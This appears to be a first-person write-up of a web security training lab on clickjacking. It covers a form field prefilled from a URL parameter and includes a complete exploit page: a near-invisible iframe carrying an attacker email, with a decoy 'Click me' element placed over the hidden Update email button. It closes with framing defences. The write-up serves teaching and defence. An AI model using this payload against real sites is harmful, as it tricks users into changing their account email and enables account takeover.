# Lab: Clickjacking with Form Input Data Prefilled from a URL Parameter

## Description

This lab demonstrates a clickjacking vulnerability in which form input data can be prepopulated using URL parameters. The objective is to trick a victim into updating their email address by clicking on a visible decoy element while the hidden **Update email** button is positioned beneath it.

## Exploitation

First, I logged into the application using the provided credentials and identified that the email field could be prefilled through a URL parameter. I then created a malicious page containing a visible **"Click me"** element and an iframe loading the account page with the attacker's email address supplied in the URL.

The iframe dimensions were adjusted and its opacity was reduced to make it nearly invisible. Next, I aligned the visible decoy element with the hidden **Update email** button inside the iframe. When the victim clicked on the visible text, the click was delivered to the hidden button, causing the prefilled email address to be submitted successfully.

### Exploit HTML

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@example.com"></iframe>
```

## Conclusion

This lab demonstrates that an attacker can combine clickjacking with URL-based form prepopulation to perform actions requiring user input with a single click. Since the request originates from the legitimate page, valid session information and CSRF tokens are included automatically. To prevent such attacks, applications should implement anti-framing protections such as **X-Frame-Options** and **Content Security Policy (CSP)** and avoid allowing sensitive form fields to be prepopulated through URL parameters.
